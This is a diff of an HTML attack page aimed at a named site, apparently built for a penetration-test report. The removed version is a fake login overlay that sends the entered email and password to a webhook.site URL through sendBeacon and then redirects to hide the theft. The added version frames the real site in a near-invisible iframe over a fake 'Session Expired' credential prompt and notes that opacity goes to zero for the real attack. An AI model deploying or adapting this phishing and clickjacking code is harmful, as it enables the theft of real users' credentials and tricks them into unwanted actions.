@@ -2,97 +2,63 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Management Console - Sign In</title>
+    <title>Account Verification</title>
     <style>
-        /* Zero out margins to allow full-screen coverage */
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; font-family: sans-serif; }
+
+        /* THE TRICK: The real site is ON TOP but INVISIBLE */
+        .target-frame { 
+            position: absolute;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            border: none;
+            z-index: 2;
+            opacity: 0.1; /* Set to 0.0 for the real attack; 0.1 for testing so you can align it */
+            cursor: text;
         }
 
-        /* The legitimate Sentiyo site loads in the background */
-        .target-frame { 
-            border: none;
-            width: 100vw; 
-            height: 100vh;
-            display: block;
+        /* THE DECEPTION: This is what the user THINKS they are clicking on */
+        .fake-background {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             z-index: 1;
         }
 
-        /* The Malicious Overlay Form: Aligns over the real login box */
-        .login-overlay {
-            position: absolute;
-            top: 45%; 
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #ffffff;
-            padding: 30px;
+        .fake-input-box {
+            background: white;
+            padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            z-index: 100; 
-            width: 350px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             text-align: center;
-        }
-
-        .login-overlay h2 { margin-bottom: 20px; color: #333; font-size: 20px; }
-        
-        .login-overlay input {
-            width: 90%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-
-        .login-overlay button {
-            width: 98%;
-            padding: 12px;
-            background-color: #0056b3; 
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-overlay">
-        <h2>Sign in to Sentiyo</h2>
-        <input type="text" id="fake_user" placeholder="Email or Username" required>
-        <input type="password" id="fake_pass" placeholder="Password" required>
-        <button onclick="captureData()">Login</button>
+    <div class="fake-background">
+        <div class="fake-input-box">
+            <h2>Session Expired</h2>
+            <p>Please re-enter your credentials to continue.</p>
+            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px; width: 300px; color: #888;">Email</div>
+            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px; width: 300px; color: #888;">Password</div>
+            <div style="background: #0056b3; color: white; padding: 10px; margin: 10px; width: 300px;">Login</div>
+        </div>
     </div>
 
-    <iframe src="https://aws.sentiyo.com" class="target-frame"></iframe>
+    <iframe src="https://aws.sentiyo.com" class="target-frame" id="victim-frame"></iframe>
 
     <script>
-        function captureData() {
-            const email = document.getElementById('fake_user').value;
-            const pass = document.getElementById('fake_pass').value;
-
-            // PASTE YOUR UNIQUE WEBHOOK.SITE URL HERE
-            const webhookURL = "https://webhook.site/000bbebf-f7bb-461d-9213-3b62a199b823";
-
-            // Use Beacon API to send data silently in the background
-            const payload = new FormData();
-            payload.append('Target', 'aws.sentiyo.com');
-            payload.append('Email', email);
-            payload.append('Password', pass);
-            payload.append('Vulnerability', 'Clickjacking / UI Redressing');
-
-            navigator.sendBeacon(webhookURL, payload);
-
-            // Immediate redirect to the real site to hide the attack
-            window.location.href = "https://aws.sentiyo.com"; 
-        }
+        // NOTE ON CAPTURING: 
+        // Browsers block scripts from reading keystrokes inside a cross-origin iframe (Same-Origin Policy).
+        // To "capture" credentials in a true Clickjacking VAPT report:
+        // You prove the user CAN be tricked into clicking "Delete" or "Transfer" 
+        // by overlaying your fake UI over the real buttons.
     </script>
-
 </body>
 </html>
